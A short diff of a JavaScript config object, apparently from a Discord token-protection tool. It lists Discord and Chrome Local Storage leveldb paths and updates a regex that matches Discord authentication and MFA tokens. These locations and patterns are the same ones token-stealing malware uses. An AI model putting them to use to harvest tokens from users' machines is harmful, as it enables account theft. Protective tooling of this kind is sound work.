@@ -19,7 +19,7 @@ const Token_Protector = {
         `${Homedir}\\AppData\\Roaming\\discord\\Local Storage\\leveldb`,
         `${Homedir}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb`
     ],
-    discord_tokens_regex: new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/, "g"),
+    discord_tokens_regex: new RegExp(/(mfa\.[a-z0-9_-]{20,})|([a-z0-9_-]{23,28}\.[a-z0-9_-]{6,7}\.[a-z0-9_-]{27})/, "g"),
     spider_time: 10000 //Milliseconds
 }
 
